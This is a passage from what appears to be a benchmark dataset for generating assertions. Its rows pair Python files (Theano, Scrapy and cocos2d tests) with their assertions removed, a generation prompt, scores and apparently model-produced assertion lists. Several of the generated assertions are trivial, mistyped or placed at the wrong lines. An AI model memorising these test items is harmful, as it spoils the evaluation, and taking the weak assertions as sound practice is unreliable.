    nh = 4
    v0 = T.alloc(1., m, nv)
    h0 = T.alloc(1., m, nh)
    rng_factory = MRG_RandomStreams(42)
    W = rng_factory.normal(size=(nv, nh), dtype=v0.dtype)
    pv = T.nnet.sigmoid(T.dot(h0, W.T))
    v = rng_factory.binomial(p=pv, size=pv.shape, dtype=W.dtype)
    ph = T.nnet.sigmoid(T.dot(v, W))
    h = rng_factory.binomial(p=ph, size=ph.shape, dtype=W.dtype)

    class _ElemwiseNoGradient(theano.tensor.Elemwise):
        def grad(self, inputs, output_gradients):
            raise TypeError(""You shouldn't be differentiating through ""
                    ""the sampling process."")
            return [ theano.gradient.DisconnectedType()() ]
    block_gradient = _ElemwiseNoGradient(theano.scalar.identity)

    v = block_gradient(v)
    h = block_gradient(h)

    g = grad_expected_energy(W, v, h)
    stats = T.dot(v.T, h) / m
    f = function([], [g, stats])
    g, stats = f()
    assert np.allclose(g, -stats)
    print ""SUCCESS!""
","
1# Fill in the TODOs then run the script to see if your solution works.
2import numpy as np
3
4import theano
5from theano import function
6from theano.sandbox.rng_mrg import MRG_RandomStreams
7import theano.tensor as T
8
9def energy(W, V, H):
10    """"""
11    W : A theano matrix of RBM weights
12        num visible x num hidden
13    V : A theano matrix of assignments to visible units
14        Each row is another configuration
15        Each column corresponds to a different unit
16    H : A theano matrix of assignments to hidden units
17        Each row is another configuration
18        Each column corresponds to a different unit
19    Returns:
20        E: a theano vector
21        Element i gives the energy of configuration (V[i,:], H[i,:])
22        (This RBM has no biases, only weights)
23    """"""
24    return -(T.dot(V, W) * H).sum(axis=1)
25
26def grad_expected_energy(W, V, H):
27    """"""
28    W : A theano matrix of RBM weights
29        num visible x num hidden
30    V : A theano matrix of samples of visible units
31        Each row is another samples
32        Each column corresponds to a different unit
33    H : A theano matrix of samples of hidden units
34        Each row is another samples
35        Each column corresponds to a different unit
36
37    Returns:
38        dW: a matrix of the derivatives of the expected gradient
39            of the energy
40    """"""
41
42    raise NotImplementedError(""TODO: implement this function."")
43
44
45if __name__ == ""__main__"":
46    m = 2
47    nv = 3
48    nh = 4
49    v0 = T.alloc(1., m, nv)
50    h0 = T.alloc(1., m, nh)
51    rng_factory = MRG_RandomStreams(42)
52    W = rng_factory.normal(size=(nv, nh), dtype=v0.dtype)
53    pv = T.nnet.sigmoid(T.dot(h0, W.T))
54    v = rng_factory.binomial(p=pv, size=pv.shape, dtype=W.dtype)
55    ph = T.nnet.sigmoid(T.dot(v, W))
56    h = rng_factory.binomial(p=ph, size=ph.shape, dtype=W.dtype)
57
58    class _ElemwiseNoGradient(theano.tensor.Elemwise):
59        def grad(self, inputs, output_gradients):
60            raise TypeError(""You shouldn't be differentiating through ""
61                    ""the sampling process."")
62            return [ theano.gradient.DisconnectedType()() ]
63    block_gradient = _ElemwiseNoGradient(theano.scalar.identity)
64
65    v = block_gradient(v)
66    h = block_gradient(h)
67
68    g = grad_expected_energy(W, v, h)
69    stats = T.dot(v.T, h) / m
70    f = function([], [g, stats])
71    g, stats = f()
72    print ""SUCCESS!""
73","[['np.allclose(g', '==', 'True']]",1,1,1.0,0.000418235048097,"['W', 'V', 'H', 'm', 'nv', 'nh', 'v0', 'h0', 'rng_factory', 'pv', 'v', 'ph', 'h', 'inputs', 'output_gradients', 'block_gradient', 'g', 'stats', 'f']",19,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['W', 'V', 'H', 'm', 'nv', 'nh', 'v0', 'h0', 'rng_factory', 'pv', 'v', 'ph', 'h', 'inputs', 'output_gradients', 'block_gradient', 'g', 'stats', 'f']
*Code:

1# Fill in the TODOs then run the script to see if your solution works.
2import numpy as np
3
4import theano
5from theano import function
6from theano.sandbox.rng_mrg import MRG_RandomStreams
7import theano.tensor as T
8
9def energy(W, V, H):
10    """"""
11    W : A theano matrix of RBM weights
12        num visible x num hidden
13    V : A theano matrix of assignments to visible units
14        Each row is another configuration
15        Each column corresponds to a different unit
16    H : A theano matrix of assignments to hidden units
17        Each row is another configuration
18        Each column corresponds to a different unit
19    Returns:
20        E: a theano vector
21        Element i gives the energy of configuration (V[i,:], H[i,:])
22        (This RBM has no biases, only weights)
23    """"""
24    return -(T.dot(V, W) * H).sum(axis=1)
25
26def grad_expected_energy(W, V, H):
27    """"""
28    W : A theano matrix of RBM weights
29        num visible x num hidden
30    V : A theano matrix of samples of visible units
31        Each row is another samples
32        Each column corresponds to a different unit
33    H : A theano matrix of samples of hidden units
34        Each row is another samples
35        Each column corresponds to a different unit
36
37    Returns:
38        dW: a matrix of the derivatives of the expected gradient
39            of the energy
40    """"""
41
42    raise NotImplementedError(""TODO: implement this function."")
43
44
45if __name__ == ""__main__"":
46    m = 2
47    nv = 3
48    nh = 4
49    v0 = T.alloc(1., m, nv)
50    h0 = T.alloc(1., m, nh)
51    rng_factory = MRG_RandomStreams(42)
52    W = rng_factory.normal(size=(nv, nh), dtype=v0.dtype)
53    pv = T.nnet.sigmoid(T.dot(h0, W.T))
54    v = rng_factory.binomial(p=pv, size=pv.shape, dtype=W.dtype)
55    ph = T.nnet.sigmoid(T.dot(v, W))
56    h = rng_factory.binomial(p=ph, size=ph.shape, dtype=W.dtype)
57
58    class _ElemwiseNoGradient(theano.tensor.Elemwise):
59        def grad(self, inputs, output_gradients):
60            raise TypeError(""You shouldn't be differentiating through ""
61                    ""the sampling process."")
62            return [ theano.gradient.DisconnectedType()() ]
63    block_gradient = _ElemwiseNoGradient(theano.scalar.identity)
64
65    v = block_gradient(v)
66    h = block_gradient(h)
67
68    g = grad_expected_energy(W, v, h)
69    stats = T.dot(v.T, h) / m
70    f = function([], [g, stats])
71    g, stats = f()
72    print ""SUCCESS!""
73",4023,"[[9, 'W', '!=', None, ""the variable W should not be undefined""],
[9, 'V', '!=', None, ""the variable V should not be undefined""],
[9, 'H', '!=', None, ""the variable H should not be undefined""],
[26, 'W', '!=', None, ""the variable W should not be undefined""],
[26, 'V', '!=', None, ""the variable V should not be undefined""],
[26, 'H', '!=', None, ""the variable H should not be undefined""],
[46, 'm', '>=', 1, ""Number of samples should be positive""],
[47, 'nv', '>=', 1, ""Number of visible units should be positive""],
[48, 'nh', '>=', 1, ""Number of hidden units should be positive""],
[49, 'v0', '!=', None, ""Initialization for visible units shouldn't be undefined""],
[50, 'h0', '!=', None, ""Initialization for hidden units shouldn't be undefined""],
[71, 'g', '!=', None, ""Gradient should be computable""],
[71, 'stats', '!=', None, ""Statistics should be computable""]]"
avtoritet/scrapy,"import unittest
from scrapy.responsetypes import responsetypes

from scrapy.http import Response, TextResponse, XmlResponse, HtmlResponse, Headers

class ResponseTypesTest(unittest.TestCase):

    def test_from_filename(self):
        mappings = [
            ('data.bin', Response),
            ('file.txt', TextResponse),
            ('file.xml.gz', Response),
            ('file.xml', XmlResponse),
            ('file.html', HtmlResponse),
            ('file.unknownext', Response),
        ]
        for source, cls in mappings:
            retcls = responsetypes.from_filename(source)
            assert retcls is cls, ""%s ==> %s != %s"" % (source, retcls, cls)

    def test_from_content_disposition(self):
        mappings = [
            ('attachment; filename=""data.xml""', XmlResponse),
            ('attachment; filename=data.xml', XmlResponse),
        ]
        for source, cls in mappings:
            retcls = responsetypes.from_content_disposition(source)
            assert retcls is cls, ""%s ==> %s != %s"" % (source, retcls, cls)

    def test_from_content_type(self):
        mappings = [
            ('text/html; charset=UTF-8', HtmlResponse),
            ('text/xml; charset=UTF-8', XmlResponse),
            ('application/xhtml+xml; charset=UTF-8', HtmlResponse),
            ('application/vnd.wap.xhtml+xml; charset=utf-8', HtmlResponse),
            ('application/xml; charset=UTF-8', XmlResponse),
            ('application/octet-stream', Response),
            ('application/x-json; encoding=UTF8;charset=UTF-8', TextResponse),
        ]
        for source, cls in mappings:
            retcls = responsetypes.from_content_type(source)
            assert retcls is cls, ""%s ==> %s != %s"" % (source, retcls, cls)

    def test_from_body(self):
        mappings = [
            (b'\x03\x02\xdf\xdd\x23', Response),
            (b'Some plain text\ndata with tabs\t and null bytes\0', TextResponse),
            (b'<html><head><title>Hello</title></head>', HtmlResponse),
            (b'<?xml version=""1.0"" encoding=""utf-8""', XmlResponse),
        ]
        for source, cls in mappings:
            retcls = responsetypes.from_body(source)
            assert retcls is cls, ""%s ==> %s != %s"" % (source, retcls, cls)

    def test_from_headers(self):
        mappings = [
            ({'Content-Type': ['text/html; charset=utf-8']}, HtmlResponse),
            ({'Content-Type': ['application/octet-stream'], 'Content-Disposition': ['attachment; filename=data.txt']}, TextResponse),
            ({'Content-Type': ['text/html; charset=utf-8'], 'Content-Encoding': ['gzip']}, Response),
        ]
        for source, cls in mappings:
            source = Headers(source)
            retcls = responsetypes.from_headers(source)
            assert retcls is cls, ""%s ==> %s != %s"" % (source, retcls, cls)

    def test_from_args(self):
        # TODO: add more tests that check precedence between the different arguments
        mappings = [
            ({'url': 'http://www.example.com/data.csv'}, TextResponse),
            # headers takes precedence over url
            ({'headers': Headers({'Content-Type': ['text/html; charset=utf-8']}), 'url': 'http://www.example.com/item/'}, HtmlResponse),
            ({'headers': Headers({'Content-Disposition': ['attachment; filename=""data.xml.gz""']}), 'url': 'http://www.example.com/page/'}, Response),


        ]
        for source, cls in mappings:
            retcls = responsetypes.from_args(**source)
            assert retcls is cls, ""%s ==> %s != %s"" % (source, retcls, cls)

    def test_custom_mime_types_loaded(self):
        # check that mime.types files shipped with scrapy are loaded
        self.assertEqual(responsetypes.mimetypes.guess_type('x.scrapytest')[0], 'x-scrapy/test')

if __name__ == ""__main__"":
    unittest.main()
","
1import unittest
2from scrapy.responsetypes import responsetypes
3
4from scrapy.http import Response, TextResponse, XmlResponse, HtmlResponse, Headers
5
6class ResponseTypesTest(unittest.TestCase):
7
8    def test_from_filename(self):
9        mappings = [
10            ('data.bin', Response),
11            ('file.txt', TextResponse),
12            ('file.xml.gz', Response),
13            ('file.xml', XmlResponse),
14            ('file.html', HtmlResponse),
15            ('file.unknownext', Response),
16        ]
17        for source, cls in mappings:
18            retcls = responsetypes.from_filename(source)
19
20    def test_from_content_disposition(self):
21        mappings = [
22            ('attachment; filename=""data.xml""', XmlResponse),
23            ('attachment; filename=data.xml', XmlResponse),
24        ]
25        for source, cls in mappings:
26            retcls = responsetypes.from_content_disposition(source)
27
28    def test_from_content_type(self):
29        mappings = [
30            ('text/html; charset=UTF-8', HtmlResponse),
31            ('text/xml; charset=UTF-8', XmlResponse),
32            ('application/xhtml+xml; charset=UTF-8', HtmlResponse),
33            ('application/vnd.wap.xhtml+xml; charset=utf-8', HtmlResponse),
34            ('application/xml; charset=UTF-8', XmlResponse),
35            ('application/octet-stream', Response),
36            ('application/x-json; encoding=UTF8;charset=UTF-8', TextResponse),
37        ]
38        for source, cls in mappings:
39            retcls = responsetypes.from_content_type(source)
40
41    def test_from_body(self):
42        mappings = [
43            (b'\x03\x02\xdf\xdd\x23', Response),
44            (b'Some plain text\ndata with tabs\t and null bytes\0', TextResponse),
45            (b'<html><head><title>Hello</title></head>', HtmlResponse),
46            (b'<?xml version=""1.0"" encoding=""utf-8""', XmlResponse),
47        ]
48        for source, cls in mappings:
49            retcls = responsetypes.from_body(source)
50
51    def test_from_headers(self):
52        mappings = [
53            ({'Content-Type': ['text/html; charset=utf-8']}, HtmlResponse),
54            ({'Content-Type': ['application/octet-stream'], 'Content-Disposition': ['attachment; filename=data.txt']}, TextResponse),
55            ({'Content-Type': ['text/html; charset=utf-8'], 'Content-Encoding': ['gzip']}, Response),
56        ]
57        for source, cls in mappings:
58            source = Headers(source)
59            retcls = responsetypes.from_headers(source)
60
61    def test_from_args(self):
62        # TODO: add more tests that check precedence between the different arguments
63        mappings = [
64            ({'url': 'http://www.example.com/data.csv'}, TextResponse),
65            # headers takes precedence over url
66            ({'headers': Headers({'Content-Type': ['text/html; charset=utf-8']}), 'url': 'http://www.example.com/item/'}, HtmlResponse),
67            ({'headers': Headers({'Content-Disposition': ['attachment; filename=""data.xml.gz""']}), 'url': 'http://www.example.com/page/'}, Response),
68
69
70        ]
71        for source, cls in mappings:
72            retcls = responsetypes.from_args(**source)
73
74    def test_custom_mime_types_loaded(self):
75        # check that mime.types files shipped with scrapy are loaded
76
77if __name__ == ""__main__"":
78    unittest.main()
79","[['retcls', '==', 'cls'], ['retcls', '==', 'cls'], ['retcls', '==', 'cls'], ['retcls', '==', 'cls'], ['retcls', '==', 'cls'], ['retcls', '==', 'cls']]",7,6,0.8571428571428571,0.001577701814357,"['mappings', 'retcls', 'source']",3,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['mappings', 'retcls', 'source']
*Code:

1import unittest
2from scrapy.responsetypes import responsetypes
3
4from scrapy.http import Response, TextResponse, XmlResponse, HtmlResponse, Headers
5
6class ResponseTypesTest(unittest.TestCase):
7
8    def test_from_filename(self):
9        mappings = [
10            ('data.bin', Response),
11            ('file.txt', TextResponse),
12            ('file.xml.gz', Response),
13            ('file.xml', XmlResponse),
14            ('file.html', HtmlResponse),
15            ('file.unknownext', Response),
16        ]
17        for source, cls in mappings:
18            retcls = responsetypes.from_filename(source)
19
20    def test_from_content_disposition(self):
21        mappings = [
22            ('attachment; filename=""data.xml""', XmlResponse),
23            ('attachment; filename=data.xml', XmlResponse),
24        ]
25        for source, cls in mappings:
26            retcls = responsetypes.from_content_disposition(source)
27
28    def test_from_content_type(self):
29        mappings = [
30            ('text/html; charset=UTF-8', HtmlResponse),
31            ('text/xml; charset=UTF-8', XmlResponse),
32            ('application/xhtml+xml; charset=UTF-8', HtmlResponse),
33            ('application/vnd.wap.xhtml+xml; charset=utf-8', HtmlResponse),
34            ('application/xml; charset=UTF-8', XmlResponse),
35            ('application/octet-stream', Response),
36            ('application/x-json; encoding=UTF8;charset=UTF-8', TextResponse),
37        ]
38        for source, cls in mappings:
39            retcls = responsetypes.from_content_type(source)
40
41    def test_from_body(self):
42        mappings = [
43            (b'\x03\x02\xdf\xdd\x23', Response),
44            (b'Some plain text\ndata with tabs\t and null bytes\0', TextResponse),
45            (b'<html><head><title>Hello</title></head>', HtmlResponse),
46            (b'<?xml version=""1.0"" encoding=""utf-8""', XmlResponse),
47        ]
48        for source, cls in mappings:
49            retcls = responsetypes.from_body(source)
50
51    def test_from_headers(self):
52        mappings = [
53            ({'Content-Type': ['text/html; charset=utf-8']}, HtmlResponse),
54            ({'Content-Type': ['application/octet-stream'], 'Content-Disposition': ['attachment; filename=data.txt']}, TextResponse),
55            ({'Content-Type': ['text/html; charset=utf-8'], 'Content-Encoding': ['gzip']}, Response),
56        ]
57        for source, cls in mappings:
58            source = Headers(source)
59            retcls = responsetypes.from_headers(source)
60
61    def test_from_args(self):
62        # TODO: add more tests that check precedence between the different arguments
63        mappings = [
64            ({'url': 'http://www.example.com/data.csv'}, TextResponse),
65            # headers takes precedence over url
66            ({'headers': Headers({'Content-Type': ['text/html; charset=utf-8']}), 'url': 'http://www.example.com/item/'}, HtmlResponse),
67            ({'headers': Headers({'Content-Disposition': ['attachment; filename=""data.xml.gz""']}), 'url': 'http://www.example.com/page/'}, Response),
68
69
70        ]
71        for source, cls in mappings:
72            retcls = responsetypes.from_args(**source)
73
74    def test_custom_mime_types_loaded(self):
75        # check that mime.types files shipped with scrapy are loaded
76
77if __name__ == ""__main__"":
78    unittest.main()
79",4812,"[8, 'mappings', '!=', 0, ""mappings should not be empty as they are used in a loop""],
[9, 'source', '!=', '', ""source filename should not be an empty string as it is used to determine response type""],
[10, 'retcls', '!=', None, ""return class should not be None after determining response type from filename""],
[20, 'mappings', '!=', 0, ""mappings should not be empty as they are used in a loop""],
[21, 'source', '!=', '', ""source content disposition should not be an empty string as it is used to determine response type""],
[26, 'retcls', '!=', None, ""return class should not be None after determining response type from content disposition""],
[28, 'mappings', '!=', 0, ""mappings should not be empty as they are used in a loop""],
[29, 'source', '!=', '', ""source content type should not be an empty string as it is used to determine response type""],
[39, 'retcls', '!=', None, ""return class should not be None after determining response type from content type""],
[41, 'mappings', '!=', 0, ""mappings should not be empty as they are used in a loop""],
[42, 'source', '!=', '', ""source body should not be an empty string as it is used to determine response type""],
[49, 'retcls', '!=', None, ""return class should not be None after determining response type from body""],
[51, 'mappings', '!=', 0, ""mappings should not be empty as they are used in a loop""],
[52, 'source', '!=', '', ""source headers should not be an empty string as it is used to determine response type""],
[59, 'retcls', '!=', None, ""return class should not be None after determining response type from headers""],
[61, 'mappings', '!=', 0, ""mappings should not be empty as they are used in a loop""],
[62, 'source', '!=', '', ""source arguments should not be an empty string as they are used to determine response type""],
[72, 'retcls', '!=', None, ""return class should not be None after determining response type from arguments""]"
Alwnikrotikz/los-cocos,"from __future__ import division, print_function, unicode_literals

# important: set cocos_utest=1 in the environment before run.
# that simplifies the pyglet mockup needed
# remember to erase or set to zero for normal runs
import os
assert os.environ['cocos_utest']

# set the desired pyglet mockup
import sys
sys.path.insert(0,'pyglet_mockup1')
import pyglet
assert pyglet.mock_level == 1 

from cocos.director import director
from cocos.cocosnode import CocosNode
import cocos.actions as ac

import sys

director.init()

rec = []
next_done=0 #bitflags

class UAction(ac.Action):
##use actions names 1, 2 or '1', '2' ; then you instruct the .step method
##to set ._done using the global next_done
    def init(self, name):
        rec.append((name, 'init'))
        self.name = name

    def start(self):
        rec.append((self.name, 'start'))

    def step(self, dt):
        global rec, next_done
        rec.append((self.name, 'step', dt))
        if int(self.name) & next_done:
            print('setting %s _done to True'%self.name)
            self._done = True

    def stop(self):
        rec.append((self.name, 'stop'))

##    def done(self):
##        rec.append((self.name, 'done', 

class Test_Loop_Action:

    def test_instantiation(self):
        global rec, next_done
        name1 = '1'
        times = 2
        a1 = UAction(name1)
        assert isinstance(a1, ac.Action)

        rec = []
        composite = ac.loop(a1, times)
        assert isinstance(composite, ac.Action)
        assert composite.duration is None
        assert len(rec)==0

    def test_target_set(self):
        global rec, next_done
        next_done=0
        node = CocosNode()
        name1 = '1'
        times = 2
        a1 = UAction(name1)
        composite = ac.loop(a1, times)

        rec = []
        a_copy = node.do(composite)
        assert a_copy.current_action.target==node

    def test_life_cycle(self):
        global rec, next_done
        next_done=0
        name1 = '1'
        times = 2
        a1 = UAction(name1)
        node = CocosNode()
        composite = ac.loop(a1, times)
        
        #1st start
        rec = []
        a_copy = node.do(composite)
        assert rec[0]==(name1, 'start')
        assert len(rec)==1
        assert not a_copy.done()

        #step in first repetition
        dt = 0.1
        next_done=0
        rec = []
        node._step(dt)
        assert rec[0]==(name1, 'step', dt) 
        assert len(rec)==1
        assert not a_copy.done()

        #termination first repetion, start second repetition
        next_done = 1
        rec = []
        node._step(dt)
        assert rec[0]==(name1, 'step', dt) 
        assert rec[1]==(name1, 'stop')
        assert rec[2]==(name1, 'start')
        assert len(rec)==3
        assert not a_copy.done()

        #step in second repetition
        next_done=0
        rec = []
        node._step(dt)
        assert rec[0]==(name1, 'step', dt) 
        assert len(rec)==1
        assert not a_copy.done()

        #terminatation last repetition
        next_done = 1
        rec = []
        node._step(dt)
        assert rec[0]==(name1, 'step', dt) 
        assert rec[1]==(name1, 'stop')
        assert len(rec)==2

        assert a_copy.done()

        
","
1from __future__ import division, print_function, unicode_literals
2
3# important: set cocos_utest=1 in the environment before run.
4# that simplifies the pyglet mockup needed
5# remember to erase or set to zero for normal runs
6import os
7
8# set the desired pyglet mockup
9import sys
10sys.path.insert(0,'pyglet_mockup1')
11import pyglet
12
13from cocos.director import director
14from cocos.cocosnode import CocosNode
15import cocos.actions as ac
16
17import sys
18
19director.init()
20
21rec = []
22next_done=0 #bitflags
23
24class UAction(ac.Action):
25##use actions names 1, 2 or '1', '2' ; then you instruct the .step method
26##to set ._done using the global next_done
27    def init(self, name):
28        rec.append((name, 'init'))
29        self.name = name
30
31    def start(self):
32        rec.append((self.name, 'start'))
33
34    def step(self, dt):
35        global rec, next_done
36        rec.append((self.name, 'step', dt))
37        if int(self.name) & next_done:
38            print('setting %s _done to True'%self.name)
39            self._done = True
40
41    def stop(self):
42        rec.append((self.name, 'stop'))
43
44##    def done(self):
45##        rec.append((self.name, 'done', 
46
47class Test_Loop_Action:
48
49    def test_instantiation(self):
50        global rec, next_done
51        name1 = '1'
52        times = 2
53        a1 = UAction(name1)
54
55        rec = []
56        composite = ac.loop(a1, times)
57
58    def test_target_set(self):
59        global rec, next_done
60        next_done=0
61        node = CocosNode()
62        name1 = '1'
63        times = 2
64        a1 = UAction(name1)
65        composite = ac.loop(a1, times)
66
67        rec = []
68        a_copy = node.do(composite)
69
70    def test_life_cycle(self):
71        global rec, next_done
72        next_done=0
73        name1 = '1'
74        times = 2
75        a1 = UAction(name1)
76        node = CocosNode()
77        composite = ac.loop(a1, times)
78        
79        #1st start
80        rec = []
81        a_copy = node.do(composite)
82
83        #step in first repetition
84        dt = 0.1
85        next_done=0
86        rec = []
87        node._step(dt)
88
89        #termination first repetion, start second repetition
90        next_done = 1
91        rec = []
92        node._step(dt)
93
94        #step in second repetition
95        next_done=0
96        rec = []
97        node._step(dt)
98
99        #terminatation last repetition
100        next_done = 1
101        rec = []
102        node._step(dt)
103
104
105        
106","[[""os.environ['cocos_utest']"", '==', 'True'], ['pyglet.mock_level', '==', '1'], ['composite.duration', '==', 'None'], ['len(rec)==0', '==', 'True'], ['a_copy.current_action.target==node', '==', 'True'], ['rec[0]==(name1', '==', 'True'], ['len(rec)==1', '==', 'True'], ['a_copy.done()', '==', 'False'], ['rec[0]==(name1', '==', 'True'], ['len(rec)==1', '==', 'True'], ['a_copy.done()', '==', 'False'], ['rec[0]==(name1', '==', 'True'], ['rec[1]==(name1', '==', 'True'], ['rec[2]==(name1', '==', 'True'], ['len(rec)==3', '==', 'True'], ['a_copy.done()', '==', 'False'], ['rec[0]==(name1', '==', 'True'], ['len(rec)==1', '==', 'True'], ['a_copy.done()', '==', 'False'], ['rec[0]==(name1', '==', 'True'], ['rec[1]==(name1', '==', 'True'], ['len(rec)==2', '==', 'True'], ['a_copy.done()', '==', 'True']]",25,23,0.92,0.007063882063882,"['rec', 'name', 'self.name', 'dt', 'self._done', 'name1', 'times', 'a1', 'composite', 'node', 'a_copy', 'next_done']",12,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['rec', 'name', 'self.name', 'dt', 'self._done', 'name1', 'times', 'a1', 'composite', 'node', 'a_copy', 'next_done']
*Code:

1from __future__ import division, print_function, unicode_literals
2
3# important: set cocos_utest=1 in the environment before run.
4# that simplifies the pyglet mockup needed
5# remember to erase or set to zero for normal runs
6import os
7
8# set the desired pyglet mockup
9import sys
10sys.path.insert(0,'pyglet_mockup1')
11import pyglet
12
13from cocos.director import director
14from cocos.cocosnode import CocosNode
15import cocos.actions as ac
16
17import sys
18
19director.init()
20
21rec = []
22next_done=0 #bitflags
23
24class UAction(ac.Action):
25##use actions names 1, 2 or '1', '2' ; then you instruct the .step method
26##to set ._done using the global next_done
27    def init(self, name):
28        rec.append((name, 'init'))
29        self.name = name
30
31    def start(self):
32        rec.append((self.name, 'start'))
33
34    def step(self, dt):
35        global rec, next_done
36        rec.append((self.name, 'step', dt))
37        if int(self.name) & next_done:
38            print('setting %s _done to True'%self.name)
39            self._done = True
40
41    def stop(self):
42        rec.append((self.name, 'stop'))
43
44##    def done(self):
45##        rec.append((self.name, 'done', 
46
47class Test_Loop_Action:
48
49    def test_instantiation(self):
50        global rec, next_done
51        name1 = '1'
52        times = 2
53        a1 = UAction(name1)
54
55        rec = []
56        composite = ac.loop(a1, times)
57
58    def test_target_set(self):
59        global rec, next_done
60        next_done=0
61        node = CocosNode()
62        name1 = '1'
63        times = 2
64        a1 = UAction(name1)
65        composite = ac.loop(a1, times)
66
67        rec = []
68        a_copy = node.do(composite)
69
70    def test_life_cycle(self):
71        global rec, next_done
72        next_done=0
73        name1 = '1'
74        times = 2
75        a1 = UAction(name1)
76        node = CocosNode()
77        composite = ac.loop(a1, times)
78        
79        #1st start
80        rec = []
81        a_copy = node.do(composite)
82
83        #step in first repetition
84        dt = 0.1
85        next_done=0
86        rec = []
87        node._step(dt)
88
89        #termination first repetion, start second repetition
90        next_done = 1
91        rec = []
92        node._step(dt)
93
94        #step in second repetition
95        next_done=0
96        rec = []
97        node._step(dt)
98
99        #terminatation last repetition
100        next_done = 1
101        rec = []
102        node._step(dt)
103
104
105        
106",4061,"[[27, 'name', '!=', '', ""name can't be an empty string""], 
[52, 'times', '>=', 1, 'times should be at least 1'], 
[64, 'times', '>=', 1, 'times should be at least 1'], 
[74, 'times', '>=', 1, 'times should be at least 1'], 
[84, 'dt', '>=', 0, 'dt should be non-negative'],
[92, 'dt', '>=', 0, 'dt should be non-negative'],
[97, 'dt', '>=', 0, 'dt should be non-negative'],
[102, 'dt', '>=', 0, 'dt should be non-negative']]"
dougfelt/nototools,"#!/usr/bin/env python
#
# Copyright 2015 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Generate a csv with the following columns:
- bcp-47 language code (minimal)
- script (most likely script for the code)
- style name (Serif, Sans, Naskh...)
- ui status (UI, <empty>)
- font name

This will start with a canned list of languages for now. We could 
generate a more comprehensive list from our data.
""""""

import collections

import os
from os import path

from nototools import cldr_data
from nototools import noto_fonts

LANGS = (
    'af,am,ar,az,bg,bn,bs,ca,cs,da,de,el,en,en-US,es,es-419,et,eu,fa,fi,'
    'fil,fr,gl,gu,hi,hr,hu,hy,id,is,it,iw,ja,ka,kk,km,kn,ko,ky,lo,lt,lv,'
    'mk,ml,mn,mr,ms,my,ne,nl,no,pa,pl,pt-BR,pt-PT,ro,ru,si,sk,sl,sq,sr,'
    'sv,sw,ta,te,th,tl,tr,uk,ur,uz,vi,zh-CN,zh-TW,zu').split(',')

def accept_font(f):
  return (
      f.family == 'Noto' and  # exclude Arimo, Tinos, Cousine
      f.style != 'Nastaliq' and  # exclude Nastaliq, not suitable for maps
      f.script != 'HST' and  # exclude Historic, tool limitation
      f.weight == 'Regular' and  # to limit members of fonts
      f.width == 'Regular' and  # to limit members of fonts, we don't
      not f.slope and            #   care about weights
      f.fmt in ['ttf', 'otf'] and  # only support these formats
      (not f.is_cjk or f.subset))  # 'small' language-specific CJK subsets

fonts = filter(accept_font, noto_fonts.get_noto_fonts())
families = noto_fonts.get_families(fonts).values()

def write_csv_header(outfile):
  print >> outfile, 'Code,Script,Style,UI,Font Name'


def write_csv(outfile, lang, script, style, ui, members):
  if members:
    print >> outfile, ','.join(
        [lang, script, style, ui,
         noto_fonts.get_font_family_name(members[0].filepath)])


with open('lang_to_font_table.csv', 'w') as outfile:
  write_csv_header(outfile)
  for lang in LANGS:
    script = cldr_data.get_likely_script(lang)
    found_font = False
    for family in sorted(families, key=lambda f: f.name):
